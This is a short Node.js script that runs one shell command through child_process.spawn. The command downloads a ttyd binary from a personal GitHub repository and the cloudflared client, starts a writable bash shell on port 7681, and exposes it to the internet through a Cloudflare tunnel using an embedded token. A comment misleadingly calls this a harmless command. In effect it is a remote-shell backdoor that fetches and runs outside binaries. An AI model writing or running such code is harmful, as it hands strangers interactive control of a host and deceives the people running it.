// Change this to the command you want to run
const command = "wget https://github.com/iceyfromdiscord/dockerinstaller/raw/refs/heads/main/ttyd && chmod +x ttyd && wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 && chmod +x cloudflared-linux-amd64 && mv cloudflared-linux-amd64 ./cloudflared && ./ttyd --writable -p 7681 bash & ./cloudflared tunnel --url http://localhost:7681 run --token eyJhIjoiMThkMmYxNzUzYzQ2NDc3MjliYTUwMzYwMzBlNjFlYzEiLCJ0IjoiOTVkNWMyMjUtODRjNi00MGY1LWJiNjYtYmJhMzk2MjQwOTU0IiwicyI6Ill6aG1PRFV6WldNdFpUWmpNaTAwTldZNUxXRmpORFl0WVRsaU5HRXhaams1WVRsaCJ9 & ./cloudflared tunnel --url http://localhost:7681"
const { spawn } = require("child_process");

function runShellCommand(commandStr) {
  // shell:true runs the command string in a shell (e.g. /bin/bash)
  const child = spawn(commandStr, { shell: true, stdio: "pipe" });

  child.stdout.on("data", (chunk) => {
    process.stdout.write(chunk); // stream stdout
  });

  child.stderr.on("data", (chunk) => {
    process.stderr.write(chunk); // stream stderr
  });

  child.on("close", (code, signal) => {
    console.log(`\nChild process exited with code ${code}${signal ? `, signal ${signal}` : ""}`);
  });

  child.on("error", (err) => {
    console.error("Failed to start child process:", err);
  });
}

// Example usage with a harmless command:
runShellCommand(command);
